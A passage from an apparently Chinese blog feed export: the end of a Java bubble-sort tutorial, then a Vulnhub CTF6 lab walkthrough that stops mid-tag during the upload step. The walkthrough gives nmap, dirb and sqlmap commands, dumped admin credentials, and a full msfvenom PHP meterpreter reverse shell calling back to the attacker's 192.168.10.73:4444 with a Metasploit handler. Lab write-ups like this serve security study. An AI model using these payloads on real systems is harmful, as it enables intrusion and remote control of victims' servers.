class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//每次输出完之后换行</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果要实现第二轮就可以直接把第一轮的代码再复制一遍即可，但是太麻烦了，所以这里就需要用到二层循环，因为有四轮循环，所以代码如下，就已经实现了代码，但是现在需要把代码变活，万一数组变了怎么办。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">chapter6<span class="token punctuation">.</span></span>冒泡排序<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> maopao <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> arr<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">//定义temp变量</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment">//增加外层循环，因为有四轮循环所以循环四次</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/*            * 每次循环完成之后需要减去一个1            * 因为第第一轮比较已经比较完成，也就是第一个最大的数已经出来了            * 就需要第二个最大的数字，就所以减去一个1，但是第一次循环的时候            * 时候不需要减去，所以就减去0即可            *            * */</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">4</span> <span class="token operator">-</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//假设这里是第一次循环j为0那么就判断的是arr[0] > arr[1]</span>                <span class="token comment">//也就是判断24 > 69</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">//进行转换操作，稍微看看还是能看懂的因为进行两个数字转换</span>                    <span class="token comment">//需要用到变量</span>                    temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                    arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//输出每次交换过后的数字</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//每次输出完之后换行</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改代码如下。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">chapter6<span class="token punctuation">.</span></span>冒泡排序<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> maopao <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> arr<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">//定义temp变量</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment">//增加外层循环，因为有四轮循环所以循环四次</span>        <span class="token comment">/*        *       这里四次可以发现是数组长度减1        * 可以把i &lt; 4修改为 i &lt; i &lt; arr.length - 1        *        * */</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/*            * 每次循环完成之后需要减去一个1            * 因为第第一轮比较已经比较完成，也就是第一个最大的数已经出来了            * 就需要第二个最大的数字，就所以减去一个1，但是第一次循环的时候            * 时候不需要减去，所以就减去0即可            *            * */</span>            <span class="token comment">/*            *       这里四次和上面一样            *            * */</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//假设这里是第一次循环j为0那么就判断的是arr[0] > arr[1]</span>                <span class="token comment">//也就是判断24 > 69</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">//进行转换操作，稍微看看还是能看懂的因为进行两个数字转换</span>                    <span class="token comment">//需要用到变量</span>                    temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                    arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"======第"</span><span class="token operator">+</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"轮比较======"</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//输出每次交换过后的数字</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//每次输出完之后换行</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-CTF6靶机实战</title>
      <link href="/2022/0572707f21.html"/>
      <url>/2022/0572707f21.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/lampsecurity-ctf6,85/">下载地址</a></p><blockquote><p>KALI地址：192.168.10.73</p><p>靶机地址：192.168.10.40</p></blockquote><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用命令如下，来进行主机发现</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.10.73<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图发现了靶机地址</p><p><img src="/images/wordimage/2022/0517/net.png"></p><hr><h3 id="2-主机扫描"><a href="#2-主机扫描" class="headerlink" title="2.主机扫描"></a>2.主机扫描</h3><p>这使用的是nmap命令来进行的主机扫描，如下命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -p- <span class="token number">192.168</span>.10.40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，扫描结果，发现开放了很多端口</p><p><img src="/images/wordimage/2022/0517/nmap.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>既然扫描端口开放了80端口，那么肯定是网站，那么二话不说直接来一通目录扫描，使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.10.40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，扫出来很多目录，红色箭头是我自己觉得可能很重要的目录</p><p><img src="/images/wordimage/2022/0517/dirb.png"></p><hr><h3 id="4-网页信息收集"><a href="#4-网页信息收集" class="headerlink" title="4.网页信息收集"></a>4.网页信息收集</h3><p>我们打开网站首页发现类似于文章的页面，并且有login，证明可以登录，然后每篇文章都可以点<code>Read More</code>，但是点进去之后，发现上面URL地址，是id出头的，经过测试可以更换后面的数字进行文章跳转，如果在后面加一个其他字符，就不能跳转了，猜测可能有SQL注入，如下图。</p><p><img src="/images/wordimage/2022/0517/SQL.png"></p><p>根据上面信目录扫描，发现了一个邮件系统，如下图，可能有用</p><p><img src="/images/wordimage/2022/0517/mail.png"></p><p>然后我们访问doc目录，发现了一个压缩包可以下载下来,并且里面还有一个phpinfo，可以看看php版本</p><p><img src="/images/wordimage/2022/0517/doc.png"></p><p>我们访问<code>sql</code>目录，发现了一个文件，并且文件里面有密码和用户泄露，可能有用，如下图</p><p><img src="/images/wordimage/2022/0517/passanduser.png"></p><p>然后根据目录扫描还发现了<code>phpmyadmin</code>如下图，可能后面有用</p><p><img src="/images/wordimage/2022/0517/phpmyadmin.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h3><p>根据上面网页信息收集，发现文章id可能有SQL注入，我们直接使用sqlmap一把梭试试看，如下命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py -u <span class="token string">"http://192.168.10.40/?id=1"</span> --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，爆破出了所有的数据库，这里就觉得<code>cms</code>数据库可疑就他了。</p><p><img src="/images/wordimage/2022/0517/sqlmapcms.png"></p><p>所以一路凭感觉就发现了账户密码，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py -u <span class="token string">"http://192.168.10.40/?id=1"</span> -D cms -T user -C user_username,user_password --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现了账户密码，和上面网页信息收集的时候发现的账户密码一直对应了，这里猜测是后台登录密码和账户，正好首页有一个登录框。</p><blockquote><p>账户：admin</p><p>密码：adminpass</p></blockquote><p><img src="/images/wordimage/2022/0517/password.png"></p><hr><h3 id="2-文件上传"><a href="#2-文件上传" class="headerlink" title="2.文件上传"></a>2.文件上传</h3><p>根据上面SQL注入获取到的密码账户，成功登录到了后台，然后在<code>Add Event</code>选项，发现了上传选项！！！这不得上传？如下图。</p><p><img src="/images/wordimage/2022/0517/webshell.png"></p><p>然后经过测试，发现这里上传根本没有过滤，直接上传php文件即可，这里我们打开KALI，输入命令如下来生成一个php木马。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p php/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.10.73 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f raw<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成的木马代码如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">*<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">/**/</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'192.168.10.73'</span><span class="token punctuation">;</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">4444</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'stream_socket_client'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tcp://<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ip</span><span class="token punctuation">&#125;</span></span>:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$port</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fsockopen'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'socket_create'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token constant">AF_INET</span><span class="token punctuation">,</span> <span class="token constant">SOCK_STREAM</span><span class="token punctuation">,</span> <span class="token constant">SOL_TCP</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">socket_connect</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'socket'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no socket funcs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no socket'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">:</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'socket'</span><span class="token punctuation">:</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">socket_read</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$len</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nlen"</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">:</span> <span class="token variable">$b</span> <span class="token operator">.=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'socket'</span><span class="token punctuation">:</span> <span class="token variable">$b</span> <span class="token operator">.=</span> <span class="token function">socket_read</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msgsock'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">;</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msgsock_type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s_type</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'suhosin'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'suhosin.executor.disable_eval'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$suhosin_bypass</span><span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$suhosin_bypass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后我们在再msf里面打开监听，操作流程如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment"># msfconsole                                                                   </span>                                                                   _---------.             <span class="token builtin class-name">.</span><span class="token string">' #######   ;."  .---,.    ;@             @@`;   .---,..." @@@@@'</span>.,<span class="token string">'@@            @@@@@'</span>,.<span class="token string">'@@@@ ".'</span>-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @<span class="token punctuation">;</span>   <span class="token variable"><span class="token variable">`</span>.@@@@@@@@@@@@        @@@@@@@@@@@@@@ <span class="token builtin class-name">.</span><span class="token string">'     "--'</span>.@@@  -.@        @ ,<span class="token string">'-   .'</span>--<span class="token string">"          "</span>.@' <span class="token punctuation">;</span> @       @ <span class="token variable">`</span></span><span class="token builtin class-name">.</span>  <span class="token punctuation">;</span><span class="token string">'            |@@@@ @@@     @    .             '</span> @@@ @@   @@    ,              `.@@@@    @@   <span class="token builtin class-name">.</span>                                                                                         <span class="token string">',@@     @   ;           _____________                                                                  (   3 C    )     /|___ / Metasploit! \                                                                 ;@'</span><span class="token builtin class-name">.</span> __*__,.<span class="token string">"    \|--- \_____________/                                                                  '(.,...."</span>/                                                                                  <span class="token operator">=</span><span class="token punctuation">[</span> metasploit v6.1.27-dev                          <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">2196</span> exploits - <span class="token number">1162</span> auxiliary - <span class="token number">400</span> post       <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">596</span> payloads - <span class="token number">45</span> encoders - <span class="token number">10</span> nops            <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">9</span> evasion                                       <span class="token punctuation">]</span>Metasploit tip: View all productivity tips with the tips <span class="token builtin class-name">command</span>msf6 <span class="token operator">></span> use exploit/multi/handler <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcpmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> show options Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options <span class="token punctuation">(</span>generic/shell_reverse_tcp<span class="token punctuation">)</span>:   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST                   <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>   LPORT  <span class="token number">4444</span>             <span class="token function">yes</span>       The listen portExploit target:   Id  Name   --  ----   <span class="token number">0</span>   Wildcard Targetmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.10.73LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.10.73msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">></span> php/meterpreter/reverse_tcpmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.10.73:4444 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后我们再把生成的木马的代码，放进一个php文件里面然后直接上传上去即可，如下图</p><p><img 